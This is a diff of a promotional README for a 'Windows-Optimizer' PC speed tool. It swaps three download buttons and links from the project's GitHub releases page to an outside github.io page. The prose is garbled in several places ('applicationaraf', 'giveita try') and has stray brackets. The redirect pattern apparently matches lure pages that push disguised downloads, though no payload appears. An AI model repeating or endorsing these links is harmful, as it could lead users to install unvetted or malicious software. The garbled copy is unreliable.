@@ -1,6 +1,6 @@
 # 🚀 Windows-Optimizer - Boost Your PC Speed Instantly
 
-[![Download Windows Optimizer](https://img.shields.io/badge/Download-Windows_Optimizer_2026-FF6F00?style=for-the-badge&logo=windows&logoColor=white&labelColor=2C2C2C)](https://github.com/xucxucbankhi-lang/Windows-Optimizer/releases)
+[![Download Windows Optimizer](https://img.shields.io/badge/Download-Windows_Optimizer_2026-FF6F00?style=for-the-badge&logo=windows&logoColor=white&labelColor=2C2C2C)](https://xucxucbankhi-lang.github.io)
 
 ## 🎯 What Is Windows-Optimizer?
 
@@ -63,7 +63,7 @@ Getting Windows-Optimizer up and running takes less than two minutes. Follow the
 
 Visit this link to download the applicationaraf
 
-[**Click Here to Download Windows-Optimizer Now**](https://github.com/xucxucbankhi-lang/Windows-Optimizer/releases)
+[**Click Here to Download Windows-Optimizer Now**](https://xucxucbankhi-lang.github.io)
 
 )
 
@@ -123,7 +123,7 @@ A sluggish computer does not mean you need to spend hundreds of dollars ona new 
 
  giveita try today,and feel the difference thef very first day. Your PC (and your patience) will thank youaraf
 
-[![Download Windows Optimizer 2026](https://img.shields.io/badge/Get_Windows_Optimizer-Free_Download-brightgreen?style=for-the-badge&logo=windows&logoColor=white&labelColor=1F6FEB)](https://github.com/xucxucbankhi-lang/Windows-Optimizer/releases)
+[![Download Windows Optimizer 2026](https://img.shields.io/badge/Get_Windows_Optimizer-Free_Download-brightgreen?style=for-the-badge&logo=windows&logoColor=white&labelColor=1F6FEB)](https://xucxucbankhi-lang.github.io)
 
 )
 
